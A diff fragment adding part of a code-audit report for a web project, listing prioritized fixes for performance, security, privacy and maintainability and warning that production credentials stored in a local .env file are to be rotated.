+| 🟠 **P1 — This Sprint** | PERF-04 | Add database indexes to frequently queried columns | 30 min |
+| 🟠 **P1 — This Sprint** | ARCH-01 | Add connection pool config and `prepare: false` | 10 min |
+| 🟡 **P2 — Next Sprint** | SEC-03 | Implement nonce-based CSP | 2-4 hours |
+| 🟡 **P2 — Next Sprint** | SEC-06 | Add Zod validation to all action parameters | 1 hour |
+| 🟡 **P2 — Next Sprint** | PRIV-02 | Implement right-to-deletion architecture | 4 hours |
+| 🟡 **P2 — Next Sprint** | PERF-03 | Migrate to Redis-based rate limiter | 2 hours |
+| 🟢 **P3 — Backlog** | DEV-02 | Refactor bloated components | 1 day |
+| 🟢 **P3 — Backlog** | DEV-03 | Consolidate upload functions | 1 hour |
+| 🟢 **P3 — Backlog** | UX-01 | Add ARIA labels and semantic improvements | 2 hours |
+| 🟢 **P3 — Backlog** | ARCH-02 | Set up structured logging service | 2 hours |
+
+---
+
+> [!CAUTION]
+> **SEC-01 is the most urgent finding.** Your production database password, Clerk secret key, Supabase service role key, and Resend API key are all in plaintext in [.env.local](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/.env.local). **Rotate these credentials immediately**, even if [.env.local](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/.env.local) is gitignored — any past accidental commit, backup, or agent/tool access could have exposed them.
